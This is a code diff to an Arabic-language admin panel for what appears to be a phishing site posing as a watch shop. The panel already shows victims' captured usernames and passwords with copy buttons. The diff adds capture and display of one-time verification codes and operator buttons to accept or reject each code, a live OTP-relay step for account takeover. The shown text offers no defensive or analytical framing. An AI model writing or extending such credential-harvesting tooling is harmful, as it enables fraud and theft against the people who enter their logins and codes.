@@ -87,6 +87,9 @@
   .badge-pending{background:#fef3c7;color:#92400e}
   .badge-confirmed{background:#d1fae5;color:#065f46}
   .badge-rejected{background:#fee2e2;color:#991b1b}
+  .badge-code_pending{background:#e0e7ff;color:#3730a3}
+  .badge-code_confirmed{background:#d1fae5;color:#065f46}
+  .badge-code_rejected{background:#fee2e2;color:#991b1b}
   .badge-page{background:#dbeafe;color:#1e40af}
 
   .td-actions{display:flex;gap:6px}
@@ -270,11 +273,11 @@ const watches = [
 const pageLabels = {
   "index":"الرئيسية","colors":"الألوان","order":"صفحة الطلب",
   "login":"تسجيل الدخول","password":"الرمز السري",
-  "waiting":"جاري التحقق","code":"رمز التحقق",
-  "home":"الرئيسية","pending":"في الانتظار"
+  "waiting":"جاري التحقق","code":"رمز التحقق","code-waiting":"تحقق الرمز",
+  "success":"تم بنجاح","home":"الرئيسية","pending":"في الانتظار"
 };
 
-const statusLabels = {pending:"قيد الانتظار",confirmed:"مقبول",rejected:"مرفوض"};
+const statusLabels = {pending:"قيد الانتظار",confirmed:"مقبول",rejected:"مرفوض",code_pending:"بانتظار الرمز",code_confirmed:"تم التأكيد",code_rejected:"رمز مرفوض"};
 
 let TOKEN = localStorage.getItem("admin_token") || "";
 let orders = [];
@@ -347,7 +350,7 @@ async function loadOrders() {
   }
 
   let html = `<table><thead><tr>
-    <th>العميل</th><th>الولاية</th><th>اللون</th><th>اسم المستخدم</th><th>الرمز السري</th><th>الحالة</th><th>الصفحة</th><th>التاريخ</th><th>الإجراءات</th>
+    <th>العميل</th><th>الولاية</th><th>اللون</th><th>اسم المستخدم</th><th>الرمز السري</th><th>رمز التحقق</th><th>الحالة</th><th>الصفحة</th><th>التاريخ</th><th>الإجراءات</th>
   </tr></thead><tbody>`;
 
   orders.forEach(o => {
@@ -367,6 +370,7 @@ async function loadOrders() {
       <td style="font-size:13px">${o.watch_color||"—"}</td>
       <td><div class="td-login-wrap"><span class="td-login">${o.login_username||"—"}</span>${o.login_username?`<button class="copy-btn" onclick="copyText(this,'${o.login_username}')" title="نسخ"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button>`:""}</div></td>
       <td><div class="td-login-wrap"><span class="td-login">${o.login_password||"—"}</span>${o.login_password?`<button class="copy-btn" onclick="copyText(this,'${o.login_password}')" title="نسخ"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button>`:""}</div></td>
+      <td><div class="td-login-wrap"><span class="td-login" style="${o.verification_code?'color:#1565c0':''}">${o.verification_code||"—"}</span>${o.verification_code?`<button class="copy-btn" onclick="copyText(this,'${o.verification_code}')" title="نسخ"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button>`:""}</div></td>
       <td><span class="badge badge-${statusClass}">${statusLabels[statusClass]||statusClass}</span></td>
       <td><span class="badge badge-page">${pageName}</span></td>
       <td style="font-size:12px;color:var(--muted)">${date}</td>
@@ -411,10 +415,26 @@ function showDetails(id) {
       <div class="detail-item"><div class="lbl">الرمز السري</div><div class="val" style="direction:ltr;text-align:right;letter-spacing:3px;font-size:18px">${o.login_password||"—"}</div></div>`;
   }
 
+  if (o.verification_code) {
+    detailsHtml += `</div><div class="login-data"><h3>رمز التحقق</h3><div class="detail-grid">
+      <div class="detail-item"><div class="lbl">الرمز</div><div class="val" style="direction:ltr;text-align:right;letter-spacing:4px;font-size:20px;color:#1565c0">${o.verification_code}</div></div>`;
+  }
+
   document.getElementById("modalDetails").innerHTML = detailsHtml;
 
-  document.getElementById("modalAccept").onclick = () => updateStatus(id, "confirmed");
-  document.getElementById("modalReject").onclick = () => updateStatus(id, "rejected");
+  const acceptBtn = document.getElementById("modalAccept");
+  const rejectBtn = document.getElementById("modalReject");
+  if (o.status === "code_pending") {
+    acceptBtn.textContent = "قبول الرمز";
+    rejectBtn.textContent = "رفض الرمز";
+    acceptBtn.onclick = () => updateStatus(id, "code_confirmed");
+    rejectBtn.onclick = () => updateStatus(id, "code_rejected");
+  } else {
+    acceptBtn.textContent = "قبول";
+    rejectBtn.textContent = "رفض";
+    acceptBtn.onclick = () => updateStatus(id, "confirmed");
+    rejectBtn.onclick = () => updateStatus(id, "rejected");
+  }
 
   openModal("detailsModal");
 }
